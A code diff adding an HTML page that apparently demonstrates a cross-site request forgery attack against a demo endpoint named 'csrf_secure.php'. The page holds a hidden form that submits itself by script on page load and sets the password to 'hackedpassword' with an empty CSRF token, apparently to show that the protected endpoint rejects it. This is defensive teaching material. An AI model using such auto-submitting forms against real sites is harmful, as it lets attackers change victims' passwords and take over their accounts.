@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>CSRF Attack Page</title>
+  </head>
+  <body>
+    <h1>CSRF Attack in Progress...</h1>
+
+    <!-- This form tries to change the password on the victim's site -->
+    <form method="POST" action="csrf_secure.php" id="csrf_attack_form">
+      <input type="hidden" name="password_csrf_demo" value="hackedpassword" />
+      <!-- CSRF token is intentionally not included here -->
+      <input type="hidden" name="csrf_token" value="" />
+      <script>
+        // Automatically submit the form
+        document.getElementById("csrf_attack_form").submit();
+      </script>
+    </form>
+  </body>
+</html>
